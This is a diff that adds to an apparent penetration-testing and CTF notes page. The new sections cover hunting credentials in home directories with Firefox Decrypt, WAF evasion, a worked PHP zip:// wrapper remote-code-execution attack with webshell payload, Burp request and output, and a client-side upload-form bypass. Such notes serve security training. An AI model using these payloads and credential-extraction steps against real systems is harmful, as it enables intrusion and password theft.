@@ -1567,6 +1567,7 @@ Once, we have got the unprivileged shell, it is very important to check the belo
 * What are the packages installed? (dpkg -l). Maybe some vulnerable application is installed ready to be exploited (For example: chkroot version 0.49).
 * What are the services running? (netstat -ln)
 * Check the entries in the crontab!
+* What are the files present in the /home/user folder? Are there any hidden files and folders? like .thunderbird/ .bash_history etc.
 
 
 What "Advanced Linux File Permissions" are used?
@@ -2376,7 +2377,7 @@ Sometimes, inbound and outbound traffic from any port is disallowed and only ICM
 
 The above code is basically a reduced version of the powershell version of ICMP and have a limited buffer (which means commands whose output is greater than the buffer, won't be displayed!). Now, there's a painful way of transferring files to the victim system which is
 
-* Convert the file/ code which needs to be transferred in to base64. (If possible, remove all the unnecessary code/ comments, this would help us to reduce the length of the base64)
+* Convert the file/ code which needs to be transferred in to base64. (If possible, remove all the unnecessary code/ comments, this would help us to reduce the length of the base64). Do make sure that your base64 when converted back is correct! Refer `PowerShell –EncodedCommand and Round-Trips <https://blogs.msdn.microsoft.com/timid/2014/03/26/powershell-encodedcommand-and-round-trips/>`_
 * Utilize the `Add-Content cmdlet <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-5.1>`_ to transfer the file to the victim system. Do, remember to transfer the data in chunks as we have limited buffer! Probably, we have to run the below command twice or thrice to transfer the whole base64-encoded chunk.
  
  ::
@@ -3059,6 +3060,16 @@ ss - another utility to investigate sockets
               Display UDP sockets.
 
 
+User Home Directory
+-------------------
+
+If we find that home directory contains
+
+Firefox/ Thunderbird/ Seabird
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+We can utilize `Firefox Decrypt <https://github.com/unode/firefox_decrypt>`_ is a tool to extract passwords from Mozilla (Firefox/Thunderbird/Seabird) profiles. It can be used to recover passwords from a profile protected by a Master Password as long as the latter is known. If a profile is not protected by a Master Password, a password will still be requested but can be left blank.
+
 Sudoers file
 ------------
 
@@ -3560,7 +3571,7 @@ Others
 
    curl -A "bitvijays" -i "http://IPAddress/example?parameter=' whoami'"
 
-  However, it is protected by a WAF, probably, try bash globbling techniques with ? and \*. Refer `Web Application Firewall (WAF) Evasion Techniques <https://medium.com/secjuice/waf-evasion-techniques-718026d693d8>`_
+  However, it is protected by a WAF, probably, try bash globbling techniques with ? and \*. Refer `Web Application Firewall (WAF) Evasion Techniques <https://medium.com/secjuice/waf-evasion-techniques-718026d693d8>`_ and `Web Application Firewall (WAF) Evasion Techniques #2 <https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0>`_ ! Amazing stuff here!
   Also, it might be a good idea to test the command with ? on your local machine first then directly on the target.
 
 * Similar to ls there is dir in linux. Try "dir -l" Might be helpful sometimes.
@@ -3769,6 +3780,58 @@ If PHP expect wrapper is disabled, below error is encountered.
  Warning: include(): Unable to find the<br> wrapper "expect" - did you forget to enable it when you configured PHP? in <br> /var/www/fileincl/example1.php on line 7 
  Warning: include(expect://ls): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7 
  Warning: include(): Failed opening 'expect://ls' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/fileincl/example1.php on line 7
+
+PHP Wrapper zip
+^^^^^^^^^^^^^^^
+
+Let's say there is a upload functionality on the victim machine, however the file saved doesn't have executeable permission, in that case if we upload a zip file containing a shellcode such as
+
+Creating a php payload for listing current directory files (There can be other payload also. For example, php meterpreter, if the "system" is blocked use, scandir() for directory listing etc. )
+
+::
+
+ echo "<?php system("ls"); ?>" > shell.php
+
+and 
+
+::
+
+ zip shell.zip shell.php
+
+Now, if we upload this zip file somehow to the victim machine and know it's location (Let's say it got uploaded in /uploads) and filename (is def506bd2176265e006f2db3d7b4e9db11c459c1), we can do remote code execution
+
+`Zip Usage <http://php.net/manual/en/wrappers.compression.php>`_ 
+
+::
+
+ zip://archive.zip#dir/file.txt
+
+Burp Request
+
+::
+
+ GET /?op=zip://uploads/def506bd2176265e006f2db3d7b4e9db11c459c1%23shell HTTP/1.1
+ Host: 10.50.66.93
+ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+
+ %23 is the #
+
+and we get RCE
+
+::
+
+ home.php
+ index.php
+ upload.php
+ uploads
+ view.php
+
+We may read more about it at `Bypassing PHP Null Byte Injection protections – Part II – CTF Write-up <https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/>`_ or `CodeGate General CTF 2015: Owlur <https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/web/owlur>`_ -- Read other write-ups in this. 
+
+PHP Wrapper phar
+^^^^^^^^^^^^^^^^
+
+RCE can also be done using `Using Phar Archives: the phar stream wrapper <http://php.net/manual/en/phar.using.stream.php>`_ 
 
 PHP wrapper php://file
 ^^^^^^^^^^^^^^^^^^^^^^
@@ -4051,5 +4114,54 @@ Since the exif_imagetype function checks the filetype of the uploaded file. It c
 .. Tip :: Do check the source code of the page for any client-side file validation or any commented hidden parameters?
 
 We can also upload an actual .jpeg, but alter the coments in the metadata to include the php code.
+
+Modifying File Upload Page
+^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Upload forms are client-side, we can probably modify them using Inspect Element or F12. If by-chance, there's a LFI and we have seen the code of upload function. The first thing to check would be "What are the restrictions on upload i.e. Either only jpg file extension is uploaded or is file content is also check etc."
+
+Let's say, there is a upload form which has a text-field for accepting input (Let's say - suspectinfo) and the input put in this text field is stored in a file format on the server. Let's see the current form in inspect-element.
+
+Client-Side Code
+
+::
+
+ <form enctype="multipart/form-data" action="?op=upload" method="POST">
+    <textarea style="width:400px; height:150px;" id="sinfo" name="sinfo"> </textarea><br>
+	<input type="text" id="name" name="name" value="" style="width:355px;">
+    <input type="submit" name="submit" value="Send Tip!">
+ </form>
+
+If we see the above form, accepts two inputs
+
+* text type field named sinfo for providing detailed information about the server and
+* text type field named name for providing name of the server.
+
+Let's also see, serverside code
+
+::
+
+ if(isset($_POST['submit']) && isset($_POST['sinfo'])) {
+	    	$tip = $_POST['sinfo'];
+    		$secretname = genFilename();  ## Generates a random file name
+	    	file_put_contents("uploads/". $client_ip . '/' . $secretname,  $sinfo);
+
+If we see, the contents of sinfo are directly put in a file.
+
+
+In this case, if we change the input type of sinfo from text to file. We can upload a file! Imagine uploading a zip file or php file.
+
+::
+
+ <form enctype="multipart/form-data" action="?op=upload" method="POST">
+ #  <textarea style="width:400px; height:150px;" id="sinfo" name="sinfo"> </textarea><br> ---------- We have commented this and add the below line.
+	<input type="file" id="sinfo" name="sinfo" value="" style="width:355px;">
+	<input type="text" id="name" name="name" value="" style="width:355px;">
+    <input type="submit" name="submit" value="Send Tip!">
+ </form>
+
+Now, when we press submit button, probably, just make sure that the request is quite similar to the original one and we should be able to upload the file.
+
+.. Tip :: Sometimes, there might be cases when the developer has a commented a input type on the client side, however has forgotten to comment on the serverside code! Maybe, try to uncomment and see what happens!
 
 .. disqus::
